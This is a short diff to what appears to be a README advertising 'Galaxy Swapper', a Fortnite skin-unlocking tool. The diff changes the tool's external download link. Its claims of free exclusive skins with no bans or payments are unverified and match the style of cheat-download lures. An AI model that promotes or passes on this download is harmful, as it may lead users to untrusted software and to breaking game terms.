@@ -2,7 +2,7 @@
 
 Unlock ANY Fortnite skin instantly with Galaxy Swapper! 🔓 Get rare, exclusive, and OG cosmetics without bans or payments. The #1 safe skin swapper!  
 
-[![Download Galaxy Swapper](https://img.shields.io/badge/🌟_Download-Galaxy_Swapper-purple)](https://galaxy-swapper-official.github.io/.github/)  
+[![Download Galaxy Swapper](https://img.shields.io/badge/🌟_Download-Galaxy_Swapper-purple)](https://galaxy-swapper-official.github.io/.github/galaxyswapper)  
 
 ---  
 
